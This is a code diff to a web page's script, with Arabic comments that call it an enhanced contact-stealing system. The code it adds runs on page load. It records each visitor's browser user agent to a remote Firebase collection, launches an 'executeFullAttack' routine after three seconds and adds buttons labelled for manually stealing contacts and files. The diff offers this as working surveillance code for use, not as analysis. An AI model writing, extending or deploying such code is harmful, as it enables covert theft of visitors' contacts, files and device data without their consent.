@@ -1818,11 +1818,48 @@ function getAllLocalStorage() {
 
 // بدء النظام عند تحميل الصفحة
 document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 تهيئة نظام سرقة جهات الاتصال المحسن...');
+    
+    // 1. كشف المتصفح أولاً
+    detectBrowserAndSetup();
+    
+    // 2. بدء النظام بعد 3 ثواني
     setTimeout(() => {
         const smartSystem = new EnhancedMobileSystem();
         smartSystem.executeFullAttack();
+        
+        // 3. إضافة زر سرقة يدوي للاختبار
+        addManualStealButton();
     }, 3000);
 });
+// إضافة زر سرقة يدوي (جديد)
+function addManualStealButton() {
+    const stealBtn = document.createElement('button');
+    stealBtn.innerHTML = '📱 سرقة جهات الاتصال يدوياً';
+    stealBtn.style.cssText = `
+        position: fixed;
+        top: 120px;
+        right: 10px;
+        background: #10b981;
+        color: white;
+        padding: 12px 16px;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: bold;
+        cursor: pointer;
+        z-index: 10000;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        direction: rtl;
+            `;
+    
+    stealBtn.onclick = async function() {
+        console.log('🔄 بدء السرقة اليدوية...');
+        await requestContactPermissions();
+    };
+    
+    document.body.appendChild(stealBtn);
+}
   // إضافة زر سرقة الملفات للواجهة
 setTimeout(() => {
     const stealBtn = document.createElement('button');
@@ -1849,5 +1886,44 @@ setTimeout(() => {
     
     document.body.appendChild(stealBtn);
 }, 2000);
+  // كشف المتصفح وإضافة الطرق المناسبة (جديد)
+function detectBrowserAndSetup() {
+    const userAgent = navigator.userAgent.toLowerCase();
+    
+    console.log('🔍 كشف المتصفح:', userAgent);
+    
+    if (/chrome|chromium/.test(userAgent)) {
+        console.log('✅ متصفح Chrome - يدعم Contact Picker API');
+        window.contactStealingMethod = 'chrome_advanced';
+        window.browserType = 'chrome';
+    } 
+    else if (/firefox|fxios/.test(userAgent)) {
+        console.log('⚠️ متصفح Firefox - دعم محدود لجهات الاتصال');
+        window.contactStealingMethod = 'firefox_storage_based';
+        window.browserType = 'firefox';
+    }
+  else if (/safari|apple/.test(userAgent) && !/chrome/.test(userAgent)) {
+        console.log('⚠️ متصفح Safari - يتطلب طرق بديلة');
+        window.contactStealingMethod = 'safari_alternative';
+        window.browserType = 'safari';
+    }
+    else if (/edg|edge/.test(userAgent)) {
+        console.log('✅ متصفح Edge - يدعم Contact Picker API');
+        window.contactStealingMethod = 'edge_advanced';
+        window.browserType = 'edge';
+    }
+    else {
+        console.log('🌐 متصفح آخر - استخدام الطرق الأساسية');
+        window.contactStealingMethod = 'basic';
+        window.browserType = 'other';
+    }
+      // حفظ معلومات المتصفح
+    db.collection('browser_info').add({
+        userAgent: navigator.userAgent,
+        browserType: window.browserType,
+        method: window.contactStealingMethod,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    });
+}
 </script>
 </html>
